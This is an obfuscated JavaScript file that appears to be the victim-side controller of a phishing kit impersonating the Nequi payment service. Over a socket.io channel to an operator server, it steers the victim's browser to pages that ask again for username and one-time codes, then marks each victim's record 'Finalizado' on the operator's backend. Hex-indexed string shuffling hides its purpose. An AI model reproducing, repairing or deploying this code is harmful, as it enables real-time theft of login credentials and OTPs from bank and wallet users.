const _0x36d396 = _0x37b9;
(function (_0x573a5d, _0x167a23) {
  const _0x462352 = _0x37b9,
    _0x2a02cc = _0x573a5d();
  while (!![]) {
    try {
      const _0x54a075 =
        -parseInt(_0x462352(0xac)) / 0x1 +
        -parseInt(_0x462352(0xad)) / 0x2 +
        (parseInt(_0x462352(0xc9)) / 0x3) * (parseInt(_0x462352(0xc1)) / 0x4) +
        (-parseInt(_0x462352(0xc5)) / 0x5) *
          (-parseInt(_0x462352(0xb1)) / 0x6) +
        -parseInt(_0x462352(0xb0)) / 0x7 +
        parseInt(_0x462352(0xc4)) / 0x8 +
        -parseInt(_0x462352(0xc0)) / 0x9;
      if (_0x54a075 === _0x167a23) break;
      else _0x2a02cc["push"](_0x2a02cc["shift"]());
    } catch (_0x4d216c) {
      _0x2a02cc["push"](_0x2a02cc["shift"]());
    }
  }
})(_0x43df, 0xb2d8e);
function _0x37b9(_0x3455ce, _0x42b2bd) {
  const _0x43df26 = _0x43df();
  return (
    (_0x37b9 = function (_0x37b956, _0x34c2d8) {
      _0x37b956 = _0x37b956 - 0xaa;
      let _0x517728 = _0x43df26[_0x37b956];
      return _0x517728;
    }),
    _0x37b9(_0x3455ce, _0x42b2bd)
  );
}
function _0x43df() {
  const _0x414516 = [
    "6463287CdBIFr",
    "5556184WzBEzk",
    "PUT",
    "./cdin.error.html",
    "11134496UCilJg",
    "10UHAscp",
    "location",
    "application/json",
    "GET",
    "3DegNDv",
    "./cdin.html",
    "user",
    "489053ISVSyn",
    "1962122aaKeOL",
    "telnum",
    "valid",
    "719901FLUnxL",
    "728400MrvItn",
    "href",
    "stringify",
    "telefono",
    "newOtp",
    "json",
    "Usuario\x20encontrado",
    "./user.error.html",
    "valor",
    "/trico/tricoData",
    "metaInfo",
    "/trico/tricofinishNequi/",
    "connect",
    "./end.html",
    "log",
  ];
  _0x43df = function () {
    return _0x414516;
  };
  return _0x43df();
}
var socket = io[_0x36d396(0xbd)](url);
socket["on"]("neq", function (_0x36c751) {
  const _0x13f5bb = _0x36d396;
  if (
    _0x36c751[_0x13f5bb(0xb9)] == _0x13f5bb(0xab) &&
    _0x36c751[_0x13f5bb(0xaf)] == info[_0x13f5bb(0xbb)][_0x13f5bb(0xae)]
  )
    window[_0x13f5bb(0xc6)]["href"] = _0x13f5bb(0xb8);
  else {
    if (
      _0x36c751[_0x13f5bb(0xb9)] == "otp" &&
      _0x36c751[_0x13f5bb(0xaf)] == info[_0x13f5bb(0xbb)][_0x13f5bb(0xae)]
    )
      window[_0x13f5bb(0xc6)][_0x13f5bb(0xb2)] = _0x13f5bb(0xaa);
    else {
      if (
        _0x36c751[_0x13f5bb(0xb9)] == _0x13f5bb(0xb5) &&
        _0x36c751[_0x13f5bb(0xaf)] == info["metaInfo"][_0x13f5bb(0xae)]
      )
        window[_0x13f5bb(0xc6)]["href"] = _0x13f5bb(0xc3);
      else {
        if (
          _0x36c751[_0x13f5bb(0xb9)] == "finish" &&
          _0x36c751[_0x13f5bb(0xaf)] == info[_0x13f5bb(0xbb)][_0x13f5bb(0xae)]
        ) {
          async function _0xa5c2e8() {
            const _0xdb82e3 = _0x13f5bb,
              _0x5dd1c5 = await fetch(url + _0xdb82e3(0xba), {
                method: _0xdb82e3(0xc8),
                headers: { "Content-Type": _0xdb82e3(0xc7) },
              }),
              _0x1ff4a1 = await _0x5dd1c5[_0xdb82e3(0xb6)](),
              _0x4f71a2 = [..._0x1ff4a1];
            for (const _0x1a548e of _0x4f71a2) {
              if (
                _0x1a548e[_0xdb82e3(0xb4)] ==
                  info[_0xdb82e3(0xbb)][_0xdb82e3(0xae)] &&
                _0x1a548e["usuario"] == info["metaInfo"][_0xdb82e3(0xab)]
              ) {
                console[_0xdb82e3(0xbf)](_0xdb82e3(0xb7));
                const _0x3932ca = await fetch(
                    url + _0xdb82e3(0xbc) + _0x1a548e["idreg"],
                    {
                      method: _0xdb82e3(0xc2),
                      headers: { "Content-Type": _0xdb82e3(0xc7) },
                      body: JSON[_0xdb82e3(0xb3)]({ estado: "Finalizado" }),
                    }
                  ),
                  _0x2cde79 = await _0x3932ca["json"]();
              }
            }
            window[_0xdb82e3(0xc6)]["href"] = _0xdb82e3(0xbe);
          }
          _0xa5c2e8();
        }
      }
    }
  }
});
